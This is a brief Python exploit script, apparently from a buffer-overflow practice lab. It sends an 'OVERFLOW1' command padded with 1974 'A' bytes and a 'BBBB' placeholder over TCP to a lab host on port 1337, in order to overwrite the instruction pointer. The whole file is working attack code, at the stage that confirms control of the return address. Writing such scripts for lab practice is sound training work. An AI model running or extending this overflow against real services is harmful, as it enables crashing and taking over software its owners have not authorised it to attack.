 
#!/usr/bin/python3
#author : Meowhecker 

import sys
import socket 

HOST='10.10.112.31'
PORT=1337

offset = 1974
overflow = "A"*offset
EIPreturnValue = "BBBB"

prifixCmd = "OVERFLOW1 /../"
buffer = prifixCmd + overflow + EIPreturnValue
print(buffer)

try:
                
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #client.settimeout(5.0) # 設置connect方法的超時時間
    client.connect((HOST, PORT))
        
    client.send((buffer).encode())
        
    #response = client.recv(1024)
    #print(response.decode('utf-8'))
    client.close()
        
    print(f'Send success!!')

except Exception as e:
    print(e)
    print(f'fail')

sys.exit()

